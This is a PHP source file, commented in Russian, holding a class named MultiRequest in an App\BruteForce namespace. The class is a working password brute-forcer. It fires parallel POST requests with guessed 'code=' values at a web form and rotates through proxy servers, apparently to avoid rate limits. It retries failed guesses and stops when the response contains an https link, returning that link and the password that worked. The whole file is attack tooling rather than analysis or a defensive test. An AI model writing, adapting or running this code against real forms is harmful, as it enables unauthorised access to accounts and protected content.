<?php

namespace App\BruteForce;

use App\Application;

/**
 * Class MultiRequest
 * Данный класс выполняет несколько параллельных запросов к форме, пытаясь подобрать пароль
 *
 * @package App\BruteForce
 */
class MultiRequest
{
    /**
     * Генератор паролей
     *
     * @var Password
     */
    protected $passwordGenerator;

    /**
     * Адрес формы
     *
     * @var string
     */
    protected $form_address;

    /**
     * Количество запросов, которое будет сформировано за одну итерацию
     *
     * @var int
     */
    protected $number_requests_per_iteration;

    /**
     * Массив прокси-серверов для отправки запросов
     *
     * @var array[]
     */
    protected $proxies = [];

    /**
     * Хендлер мульти запроса
     *
     * @var resource
     */
    protected $mh;

    /**
     * @var int
     */
    protected $proxy_index = 0;

    /**
     * MultiRequest constructor.
     *
     * @param string $form_address
     * @param int $number_requests_per_iteration
     */
    public function __construct($form_address, $number_requests_per_iteration = 10)
    {
        $this->form_address = $form_address;
        $this->number_requests_per_iteration = intval($number_requests_per_iteration);

        $this->mh = curl_multi_init();
    }

    /**
     * @param Password $password
     */
    public function setPasswordGenerator(Password $password)
    {
        $this->passwordGenerator = $password;
    }

    /**
     * @param array[] $proxies
     */
    public function setProxies($proxies)
    {
        $this->proxies = $proxies;
    }

    /**
     * @return array
     */
    protected function getNextProxy()
    {
        if ($this->proxy_index > count($this->proxies) - 1) {
            $this->proxy_index = 0;
        }

        $proxy = $this->proxies[$this->proxy_index];

        $this->proxy_index++;

        return $proxy;
    }

    /**
     * Созадет новый ресурс curl
     *
     * @param string $data
     * @return resource
     */
    protected function init_curl($data)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $this->form_address);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        if (Application::instance()->config['use_proxy']) {
            $proxy = $this->getNextProxy();
            curl_setopt($ch, CURLOPT_PROXY, $proxy['host'] . ':' . $proxy['port']);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        }

        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

        return $ch;
    }

    /**
     * Создает несколько ресерсов запроса и помещает их в мульти запрос
     *
     * @return array
     */
    protected function setMultiRequests()
    {
        $resources = [];

        for ($i = 0; $i < $this->number_requests_per_iteration; $i++) {
            $current_password = $this->passwordGenerator->getNextPassword();

            $resources[$i] = [
                'curl' => $this->init_curl("code=" . $current_password),
                'password' => $current_password
            ];

            curl_multi_add_handle($this->mh, $resources[$i]['curl']);
        }

        return $resources;
    }

    /**
     * Запускает исполнение мультизапроса и ждет завершения его выполнения
     */
    protected function runMultiRequest()
    {
        $running = null;

        do {
            curl_multi_exec($this->mh, $running);
            curl_multi_select($this->mh);
        } while ($running > 0);
    }

    /**
     * Обрабатывает результаты выполнения запросов
     *
     * @param array $resources
     * @return array|bool
     */
    protected function requestResultProcessing($resources)
    {
        foreach ($resources as $resource)
        {
            $res = [
                'result' => curl_multi_getcontent($resource['curl']),
                'password' => $resource['password']
            ];

            if (empty($res['result']))
            {
                $this->passwordGenerator->addFailedPassword($res['password']);
            }
            else
            {
                preg_match('/(https:\/\/.*)<\/body>/i', $res['result'], $link);

                if (!empty($link))
                {
                    return [
                        'link' => $link[1],
                        'password' => $res['password']
                    ];
                }

                $result[] = $res;
            }
        }

        return false;
    }

    /**
     * Выполняет перебор паролей до пулечения успешного результата
     *
     * @return array|bool
     */
    public function send()
    {
        do
        {
            $resources = $this->setMultiRequests();

            $this->runMultiRequest();

            $result = $this->requestResultProcessing($resources);

            if ($result !== false)
            {
                return $result;
            }

            sleep(10);
        } while (true);

        return false;
    }
}